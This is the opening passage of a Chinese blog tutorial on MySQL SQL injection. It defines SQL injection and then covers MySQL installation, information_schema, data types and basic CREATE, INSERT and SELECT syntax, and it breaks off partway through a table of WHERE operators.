    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/05/21/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAsql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="wanTh3flag">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="root@wanth3f1ag">
      <meta itemprop="description" content="一条有梦想的咸鱼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="深入浅出sql注入之mysql | root@wanth3f1ag">
      <meta itemprop="description" content=" ">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          深入浅出sql注入之mysql
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-05-21 17:27:02" itemprop="dateCreated datePublished" datetime="2025-05-21T17:27:02+08:00">2025-05-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-27 15:19:57" itemprop="dateModified" datetime="2025-12-27T15:19:57+08:00">2025-12-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>85k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1:18</span>
    </span>
</div>

            <div class="post-description"> </div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="0x01sql注入前置"><a href="#0x01sql注入前置" class="headerlink" title="0x01sql注入前置"></a>0x01sql注入前置</h1><p>讲这个知识之前我们得先问自己几个问题</p>
<h2 id="什么是数据库？"><a href="#什么是数据库？" class="headerlink" title="什么是数据库？"></a>什么是数据库？</h2><p>简单来说，数据库就是“数据”的“仓库”。数据库是一个组织化的数据集合，用于存储、管理和检索信息。它为存储数据提供了一种格式化的方式，并允许用户和应用程序有效地查询、更新和管理这些数据。数据库中包含表、关系以及操作对象，数据存储在表中。</p>
<h2 id="什么是sql？"><a href="#什么是sql？" class="headerlink" title="什么是sql？"></a>什么是sql？</h2><p>SQL是结构化查询语言，是一种用于与关系数据库进行交互的标准编程语言。它用于定义、操作和控制数据，以及管理数据库。SQL 是一种高度通用的语言，几乎所有的数据库管理系统（RDBMS）都支持SQL，包括MySQL、PostgreSQL、Microsoft SQL Server 和 Oracle 等。</p>
<p>sql里有四大最常见的操作，即<strong>增删查改</strong>：</p>
<ul>
<li>增。增加数据。其简单结构为: <code>INSERT table_name(columns_name) VALUES(new_values)</code>。</li>
<li>删。删除数据。其简单结构为: <code>DELETE table_name WHERE condition</code>。</li>
<li>查。查找数据。其简单结构为：<code>SELECT columns_name FROM table_name WHERE condition</code>。</li>
<li>改。有修改&#x2F;更新数据。简单结构为:<code>UPDATE table_name SET column_name=new_value WHERE condition</code>。</li>
</ul>
<h2 id="什么是sql注入？"><a href="#什么是sql注入？" class="headerlink" title="什么是sql注入？"></a>什么是sql注入？</h2><p><strong>SQL注入：</strong>是发生于应用程序和数据库层的安全漏洞，简而言之，是在输入的字符串之中<strong>注入sql指令</strong>，在设计不良的程序当中<strong>忽略了字符检查</strong>，那么这些注入进去的恶意指令就会被数据库服务器<strong>误认为是正常的sql指令而运行</strong>，因此遭到破坏或是入侵。这种漏洞可能<strong>导致数据泄露、数据篡改、身份冒充和其他严重的安全问题</strong>。</p>
<h1 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h1><h2 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h2><p>什么是mysql?</p>
<p>MySQL 是一种开源的关系数据库管理系统（RDBMS），广泛用于存储和管理结构化数据。</p>
<p>一个MySQL服务器可以有多个数据库，每个数据库可以独立管理，互不干扰。</p>
<p>我们在讲解mysql注入之前，首先先要搭建一下mysql数据库</p>
<h3 id="Linux中搭建Mysql服务"><a href="#Linux中搭建Mysql服务" class="headerlink" title="Linux中搭建Mysql服务"></a>Linux中搭建Mysql服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su 进入root用户</span><br><span class="line"><span class="built_in">sudo</span> apt update 更新所有软件包</span><br><span class="line"><span class="built_in">sudo</span> apt install mysql-server 安装mysql</span><br><span class="line"><span class="built_in">sudo</span> systemctl start mysql 启动mysql服务</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart mysql 重启mysql服务</span><br><span class="line"><span class="built_in">sudo</span> systemctl stop mysql 关闭mysql服务</span><br><span class="line"><span class="built_in">sudo</span> systemctl status mysql 查看mysql服务状态</span><br><span class="line">mysql --version 查看版本信息</span><br><span class="line">mysql -u root -p 登录连接数据库</span><br></pre></td></tr></table></figure>

<p>连接数据库后会出现mysql的命令窗口（初始密码为空）</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501135923222.png" alt="image-20250501135923222"></p>
<p>我们先看一下初始的数据库情况是什么样的</p>
<h3 id="0-SHOW列出数据库列表"><a href="#0-SHOW列出数据库列表" class="headerlink" title="0. SHOW列出数据库列表"></a>0. SHOW列出数据库列表</h3><p><code>show databases; </code>列出 MySQL 数据库管理系统的数据库列表。</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501135942522.png" alt="image-20250501135942522"></p>
<ol>
<li><strong>mysql</strong>：存储用户权限、用户信息和其他管理相关的数据。</li>
<li><strong>information_schema</strong>：MySQL 中的一个系统数据库，它存储了关于数据库、表、列、索引、权限等元数据（metadata）的信息。</li>
</ol>
<p>里面的一些常用表：</p>
<p><strong><code>TABLES</code> 表</strong>：存储数据库中所有表的信息。</p>
<p><strong>常用字段</strong></p>
<ul>
<li><code>TABLE_SCHEMA</code>：表所属的数据库名称。</li>
<li><code>TABLE_NAME</code>：表的名称。</li>
<li><code>TABLE_TYPE</code>：表的类型（<code>BASE TABLE</code> 表示普通表，<code>VIEW</code> 表示视图）。</li>
<li><code>ENGINE</code>：表的存储引擎（如 <code>InnoDB</code>、<code>MyISAM</code>）。</li>
<li><code>TABLE_ROWS</code>：表中的行数（近似值）。</li>
<li><code>CREATE_TIME</code>：表的创建时间。</li>
</ul>
<p><strong><code>COLUMNS</code> 表</strong>：存储数据库中所有表的列信息。</p>
<p><strong>常用字段</strong></p>
<ul>
<li><code>TABLE_SCHEMA</code>：列所属的数据库名称。</li>
<li><code>TABLE_NAME</code>：列所属的表名称。</li>
<li><code>COLUMN_NAME</code>：列的名称。</li>
<li><code>DATA_TYPE</code>：列的数据类型（如 <code>INT</code>、<code>VARCHAR</code>）。</li>
<li><code>IS_NULLABLE</code>：列是否允许 <code>NULL</code> 值。</li>
<li><code>COLUMN_DEFAULT</code>：列的默认值。</li>
<li><code>CHARACTER_MAXIMUM_LENGTH</code>：字符类型列的最大长度。</li>
</ul>
<p><strong><code>SCHEMATA</code> 表</strong>：存储数据库中所有数据库的信息。</p>
<p><strong>常用字段</strong></p>
<ul>
<li><code>SCHEMA_NAME</code>：数据库的名称。</li>
<li><code>DEFAULT_CHARACTER_SET_NAME</code>：数据库的默认字符集。</li>
<li><code>DEFAULT_COLLATION_NAME</code>：数据库的默认排序规则。</li>
</ul>
<p>3.<strong>performance_schema</strong>：用于监控 MySQL 服务器性能。</p>
<p>4.<strong>sys</strong>：提供 MySQL 服务器的诊断和性能优化信息。</p>
<p>接下来我们创建数据库</p>
<h3 id="1-操作数据库"><a href="#1-操作数据库" class="headerlink" title="1. 操作数据库"></a>1. 操作数据库</h3><h4 id="1-1-CREATE创建和DROP删除数据库"><a href="#1-1-CREATE创建和DROP删除数据库" class="headerlink" title="1.1 CREATE创建和DROP删除数据库"></a>1.1 CREATE创建和DROP删除数据库</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> [database_name]; 创建HELLOWORLD数据库</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> [database_name];直接删除数据库</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> <span class="keyword">if</span> <span class="keyword">exists</span> [database_name];先检查数据库是否存在在进行删除操作</span><br></pre></td></tr></table></figure>

<p>我们创建个数据库helloworld</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501154327821.png" alt="image-20250501154327821"></p>
<p>这里看到确实是有一个helloworld数据库，那我们对这个数据库进行操作</p>
<h4 id="1-2-USE指定操作数据库"><a href="#1-2-USE指定操作数据库" class="headerlink" title="1.2 USE指定操作数据库"></a>1.2 USE指定操作数据库</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">use</span> <span class="selector-attr">[database_name]</span>; 指定要进行操作的数据库</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501154828820.png" alt="image-20250501154828820"></p>
<p>选择数据库后，你的后续 SQL 查询和操作在指定的数据库 <strong>helloworld</strong> 上执行</p>
<p>然后我们创建数据表</p>
<h3 id="2-操作数据表"><a href="#2-操作数据表" class="headerlink" title="2. 操作数据表"></a>2. 操作数据表</h3><p>我们先看一下创建的数据库里面的表是什么样的</p>
<h4 id="2-1-SHOW查看数据库中的表列表"><a href="#2-1-SHOW查看数据库中的表列表" class="headerlink" title="2.1 SHOW查看数据库中的表列表"></a>2.1 SHOW查看数据库中的表列表</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show </span>tables<span class="comment">; 查看当前数据库下的所有表</span></span><br></pre></td></tr></table></figure>

<p>不过在未创建数据表的时候数据库的内容是空的</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501154837240.png" alt="image-20250501154837240"></p>
<h4 id="2-2-CREATE创建数据表"><a href="#2-2-CREATE创建数据表" class="headerlink" title="2.2 CREATE创建数据表"></a>2.2 CREATE创建数据表</h4><p>创建 MySQL 数据表需要以下信息：</p>
<ul>
<li>表名</li>
<li>表字段名</li>
<li>定义每个表字段的数据类型</li>
</ul>
<p>语法</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE <span class="selector-tag">TABLE</span> <span class="selector-attr">[table_name]</span> (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>table_name</code> 是你要创建的表的名称。</li>
<li><code>column1</code>, <code>column2</code>, … 是表中的列名。</li>
<li><code>datatype</code> 是每个列的数据类型。</li>
</ul>
<p>不过数据类型还没学，就返回来看了一下数据类型</p>
<h5 id="mysql数据类型"><a href="#mysql数据类型" class="headerlink" title="mysql数据类型"></a>mysql数据类型</h5><p>内容摘录菜鸟教程:<a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-data-types.html">https://www.runoob.com/mysql/mysql-data-types.html</a></p>
<p>MySQL 支持多种类型，大致可以分为三类：数值、日期&#x2F;时间和字符串(字符)类型</p>
<ul>
<li>数值类型</li>
</ul>
<p>包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL 和 NUMERIC)，以及近似数值数据类型(FLOAT、REAL 和 DOUBLE PRECISION)。</p>
<table>
<thead>
<tr>
<th>TINYINT</th>
<th>1 Bytes</th>
<th>(-128，127)</th>
<th>(0，255)</th>
<th>小整数值</th>
</tr>
</thead>
<tbody><tr>
<td>SMALLINT</td>
<td>2 Bytes</td>
<td>(-32 768，32 767)</td>
<td>(0，65 535)</td>
<td>大整数值</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>3 Bytes</td>
<td>(-8 388 608，8 388 607)</td>
<td>(0，16 777 215)</td>
<td>大整数值</td>
</tr>
<tr>
<td>INT或INTEGER</td>
<td>4 Bytes</td>
<td>(-2 147 483 648，2 147 483 647)</td>
<td>(0，4 294 967 295)</td>
<td>大整数值</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8 Bytes</td>
<td>(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td>
<td>(0，18 446 744 073 709 551 615)</td>
<td>极大整数值</td>
</tr>
<tr>
<td>FLOAT</td>
<td>4 Bytes</td>
<td>(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td>
<td>0，(1.175 494 351 E-38，3.402 823 466 E+38)</td>
<td>单精度 浮点数值</td>
</tr>
<tr>
<td>DOUBLE</td>
<td>8 Bytes</td>
<td>(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td>
<td>0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td>
<td>双精度 浮点数值</td>
</tr>
<tr>
<td>DECIMAL</td>
<td>对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td>
<td>依赖于M和D的值</td>
<td>依赖于M和D的值</td>
<td>小数值</td>
</tr>
</tbody></table>
<ul>
<li>日期和时间类型</li>
</ul>
<p>表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR</p>
<table>
<thead>
<tr>
<th>DATE</th>
<th>3</th>
<th>1000-01-01&#x2F;9999-12-31</th>
<th>YYYY-MM-DD</th>
<th>日期值</th>
</tr>
</thead>
<tbody><tr>
<td>TIME</td>
<td>3</td>
<td>‘-838:59:59’&#x2F;‘838:59:59’</td>
<td>HH:MM:SS</td>
<td>时间值或持续时间</td>
</tr>
<tr>
<td>YEAR</td>
<td>1</td>
<td>1901&#x2F;2155</td>
<td>YYYY</td>
<td>年份值</td>
</tr>
<tr>
<td>DATETIME</td>
<td>8</td>
<td>‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td>
<td>YYYY-MM-DD hh:mm:ss</td>
<td>混合日期和时间值</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>4</td>
<td>‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td>
<td>YYYY-MM-DD hh:mm:ss</td>
<td>混合日期和时间值，时间戳</td>
</tr>
</tbody></table>
<ul>
<li>字符串类型</li>
</ul>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">大小</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CHAR</td>
<td align="left">0-255 bytes</td>
<td align="left">定长字符串</td>
</tr>
<tr>
<td align="left">VARCHAR</td>
<td align="left">0-65535 bytes</td>
<td align="left">变长字符串</td>
</tr>
<tr>
<td align="left">TINYBLOB</td>
<td align="left">0-255 bytes</td>
<td align="left">不超过 255 个字符的二进制字符串</td>
</tr>
<tr>
<td align="left">TINYTEXT</td>
<td align="left">0-255 bytes</td>
<td align="left">短文本字符串</td>
</tr>
<tr>
<td align="left">BLOB</td>
<td align="left">0-65 535 bytes</td>
<td align="left">二进制形式的长文本数据</td>
</tr>
<tr>
<td align="left">TEXT</td>
<td align="left">0-65 535 bytes</td>
<td align="left">长文本数据</td>
</tr>
<tr>
<td align="left">MEDIUMBLOB</td>
<td align="left">0-16 777 215 bytes</td>
<td align="left">二进制形式的中等长度文本数据</td>
</tr>
<tr>
<td align="left">MEDIUMTEXT</td>
<td align="left">0-16 777 215 bytes</td>
<td align="left">中等长度文本数据</td>
</tr>
<tr>
<td align="left">LONGBLOB</td>
<td align="left">0-4 294 967 295 bytes</td>
<td align="left">二进制形式的极大文本数据</td>
</tr>
<tr>
<td align="left">LONGTEXT</td>
<td align="left">0-4 294 967 295 bytes</td>
<td align="left">极大文本数据</td>
</tr>
</tbody></table>
<p>以上就是我们的数据类型了，那我们接下来创建一个数据表</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [table_name] (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users(</span><br><span class="line">id int auto_increment <span class="keyword">primary</span> <span class="keyword">key</span>,</span><br><span class="line">username varchar(50) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">password varchar(50) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>参数解释</p>
<ul>
<li><code>CREATE TABLE</code> 是用于创建新表的 SQL 语句。</li>
<li><code>users</code> 是要创建的表的名称。</li>
<li><code>id</code> 是表中的一个列名，用于唯一标识每个用户。</li>
<li><code>INT</code> 表示该列的数据类型是整数。</li>
<li><code>AUTO_INCREMENT</code> 表示该列会自动递增。每当插入一条新记录时，<code>id</code> 列会自动生成一个唯一的整数值，通常从 1 开始。</li>
<li><code>PRIMARY KEY</code> 指定 <code>id</code> 列作为主键，确保每个用户的 <code>id</code> 是唯一的，且不能为 NULL。这意味着在 <code>users</code> 表中，每个用户都必须有一个唯一的 <code>id</code> 值。</li>
<li><ul>
<li><code>username</code> 是表中的另一个列名，用于存储用户的用户名。</li>
<li>VARCHAR(50)&#96; 表示该列的数据类型为可变长度字符串，最大长度为 50 个字符。</li>
</ul>
</li>
<li><ul>
<li><code>NOT NULL</code> 表示该列不能为空，必须提供一个值。换句话说，用户必须输入用户名。</li>
</ul>
</li>
<li><ul>
<li><code>password</code> 是表中的第三个列名，用于存储用户的密码。</li>
</ul>
</li>
<li><ul>
<li><code>VARCHAR(100)</code> 表示该列的数据类型也是可变长度字符串，最大长度为 100 个字符。</li>
</ul>
</li>
<li><ul>
<li><code>NOT NULL</code> 同样表示该列不能为空，用户必须提供密码。</li>
</ul>
</li>
</ul>
<p>然后我们可以看到是成功创建了一个users数据表的</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501155323854.png" alt="image-20250501155323854"></p>
<p>查看一下数据表</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501155400249.png" alt="image-20250501155400249"></p>
<h4 id="2-3-RNAME修改和DROP删除表"><a href="#2-3-RNAME修改和DROP删除表" class="headerlink" title="2.3 RNAME修改和DROP删除表"></a>2.3 RNAME修改和DROP删除表</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RENAME</span> <span class="keyword">TABLE</span> [<span class="built_in">table_name</span>] <span class="keyword">to</span> [<span class="built_in">new</span> <span class="built_in">table_name</span>];修改表名</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> [<span class="built_in">table_name</span>]; 直接删除表</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> [<span class="built_in">table_name</span>];  <span class="comment">-- 会检查是否存在，如果存在则删除</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250114135354948.png" alt="image-20250114135354948"></p>
<p>创建数据表后，接下来我们就是向数据表中插入我们的数据了，我们先查看一下我们的字段</p>
<h3 id="3-操作数据"><a href="#3-操作数据" class="headerlink" title="3. 操作数据"></a>3. 操作数据</h3><h4 id="3-1-查询当前表下字段"><a href="#3-1-查询当前表下字段" class="headerlink" title="3.1 查询当前表下字段"></a>3.1 查询当前表下字段</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">full</span> <span class="keyword">columns</span> <span class="keyword">from</span> 表名;查询当前表下所有字段信息</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> 表名; 显示数据表的属性，属性类型，主键信息 ，是否为 <span class="keyword">NULL</span>，默认值等其他信息。</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501155537879.png" alt="image-20250501155537879"></p>
<p>插入数据的话通常用INSERT INTO SQL语法:</p>
<h4 id="3-2-INSERT添加数据"><a href="#3-2-INSERT添加数据" class="headerlink" title="3.2 INSERT添加数据"></a>3.2 INSERT添加数据</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">INSERT</span></span> INTO table_name (column1, column2, column3, ...)</span><br><span class="line"><span class="function"><span class="title">VALUES</span></span> (value1, value2, value3, ...);</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>table_name</code> 是你要插入数据的表的名称。</li>
<li><code>column1</code>, <code>column2</code>, <code>column3</code>, … 是表中的列名。</li>
<li><code>value1</code>, <code>value2</code>, <code>value3</code>, … 是要插入的具体数值。</li>
</ul>
<p><strong>如果字段是字符型其数据必须加上单引号或者双引号</strong></p>
<p>那我们插入一个数据看看</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into users <span class="function"><span class="params">(id,username,password)</span></span></span><br><span class="line"><span class="function">    -&gt;</span> value<span class="function"><span class="params">(<span class="number">1</span>,<span class="string">&quot;wanth3f1ag&quot;</span>,<span class="string">&quot;123456&quot;</span>)</span></span></span><br><span class="line"><span class="function">    -&gt;</span> ;</span><br></pre></td></tr></table></figure>

<p>解释来说就是插入了一行数据，id为1，username为wanth3f1ag，password为123456</p>
<p>如果你要插入所有列的数据，可以省略列名</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function">insert <span class="keyword">into</span> users <span class="title">value</span>(<span class="params"><span class="number">2</span>,<span class="string">&quot;vu1n4bly&quot;</span>,<span class="string">&quot;admin123&quot;</span></span>)</span>;</span><br></pre></td></tr></table></figure>

<p>如果你要插入多行数据，可以在 VALUES 子句中指定多组数值</p>
<p><strong>注意：</strong> 使用箭头标记 <strong>-&gt;</strong> 不是 SQL 语句的一部分，它仅仅表示一个新行，如果一条 SQL 语句太长，我们可以通过回车键来创建一个新行来编写 SQL 语句，SQL 语句的命令结束符为分号 **;**。</p>
<p>那既然插入了数据那我们就试着去查询一下数据</p>
<h3 id="4-查询数据"><a href="#4-查询数据" class="headerlink" title="4. 查询数据"></a>4. 查询数据</h3><h4 id="4-1-SELECT查询数据"><a href="#4-1-SELECT查询数据" class="headerlink" title="4.1 SELECT查询数据"></a>4.1 SELECT查询数据</h4><p>mysql用SELECT语句来查询数据</p>
<p><strong>在mysql中，windows下要区分单引号’’和反引号&#96;&#96;,(linux下不区分)：</strong></p>
<p><strong>单引号主要用于字符串的引用，反引号主要用于数据库，表，索引，列，别名</strong></p>
<p>语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line">[<span class="keyword">WHERE</span> condition]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>]]</span><br><span class="line">[<span class="keyword">LIMIT</span> <span class="keyword">number</span>];</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>column1</code>, <code>column2</code>, … 是你想要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li><code>table_name</code> 是你要从中查询数据的表的名称。</li>
<li><code>WHERE condition</code> 是一个可选的子句，用于指定过滤条件，只返回符合条件的行。</li>
<li><code>ORDER BY column_name [ASC | DESC]</code> 是一个可选的子句，用于指定结果集的排序顺序，默认是升序（ASC）。</li>
<li><code>LIMIT number</code> 是一个可选的子句，用于限制返回的行数。</li>
</ul>
<p>例如我们查询所有列</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">SELECT</span> * <span class="selector-tag">FROM</span> users;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501161209160.png" alt="image-20250501161209160"></p>
<p>也可以查询指定列</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,<span class="keyword">password</span> <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501161222713.png" alt="image-20250501161222713"></p>
<p>我们也可以添加where语句进行筛选符合条件的行</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id = <span class="number">2</span><span class="punctuation">;</span><span class="comment">// 查询id为2对应的行</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162603534.png" alt="image-20250501162603534"></p>
<p>我们还可以用LIMIT子语句限制返回的行数</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">LIMIT</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162618206.png" alt="image-20250501162618206"></p>
<p>可以用ORDER BY 子语句去对指定列进行排列</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id;</span><br></pre></td></tr></table></figure>

<p>默认是升序，DESC是降序</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p>但是SELECT语句是灵活的，我们可以根据实际需求去进行调整，这也是我们sql注入学习的前置，要对SELECT语句进行一定的了解才更有利于我们去进行sql注入的学习</p>
<p>然后我们现在来学习一下WHERE子语句的一些相关利用</p>
<h3 id="WHERE子语句"><a href="#WHERE子语句" class="headerlink" title="WHERE子语句"></a>WHERE子语句</h3><p><code>WHERE condition</code> 是用于指定过滤条件的子句。这些条件不仅限于我们的操作符(&#x3D;,&lt;,&gt;,!&#x3D;,&lt;&#x3D;,&gt;&#x3D;)，还可以用AND,OR指定一个或多个条件，模糊匹配(LIKE)等条件去匹配更精准的结果。</p>
<table>
<thead>
<tr>
<th align="left">操作符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&#x3D;</td>
<td align="left">等号，检测两个值是否相等，如果相等返回true</td>
<td align="left">(A &#x3D; B) 返回false。</td>
</tr>
<tr>
<td align="left">&lt;&gt;, !&#x3D;</td>
